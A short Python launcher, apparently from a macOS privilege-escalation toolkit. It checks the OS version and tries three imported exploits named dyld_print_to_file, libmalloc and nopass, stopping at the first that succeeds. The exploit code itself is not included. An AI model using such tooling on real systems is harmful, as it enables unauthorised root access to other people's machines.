#!/usr/bin/env python
# import plistlib
import platform
import os

from exploits import *

REDC = "\033[91m[-] "
YELLOWC = "\033[93m[!] "
GREENC = "\033[92m[+] "
ENDC = "\033[00m"


def main():
    version = platform.mac_ver()[0]
    for exploit in [dyld_print_to_file, libmalloc, nopass]:
        if not exploit.vulnerable(version):
            print(YELLOWC + "Skipping %s...\n" % exploit.__name__ + ENDC)
            continue
        print(YELLOWC + "Trying %s..." % exploit.__name__ + ENDC)
        result = exploit.run()
        if result:
            print(GREENC + "Successful" + ENDC)
            return
        print(REDC + "Failed\n" + ENDC)
    print(REDC + "All Exploits Failed..." + ENDC)


if __name__ == '__main__':
    main()
